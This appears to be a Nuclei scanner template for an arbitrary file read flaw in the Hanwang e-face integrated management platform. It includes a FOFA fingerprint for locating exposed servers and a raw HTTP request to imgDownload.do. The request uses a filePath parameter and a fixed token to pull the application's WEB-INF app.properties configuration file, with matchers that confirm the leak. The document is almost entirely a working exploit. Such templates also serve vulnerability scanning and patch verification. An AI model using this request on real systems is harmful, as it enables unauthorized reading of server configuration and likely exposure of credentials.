id: Hanwang-imgDownload-File-reading

info:
  name: 汉王e脸通综合管理平台 imgDownload.do 任意文件读取
  author: HuanXiong
  severity: medium
  description: |-
    fofa: icon_hash="1380907357"
  reference:
    - 
  tags: File reading

http:
  - raw:
      - |
        GET /manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/classes/app.properties&recoToken=ZuZBOrvLG8M HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0

    matchers:
      - type: dsl
        name: 任意文件读取
        dsl:
          - "status_code == 200 && contains (body,'是否开启调试模式') && contains (body,'服务器编号')"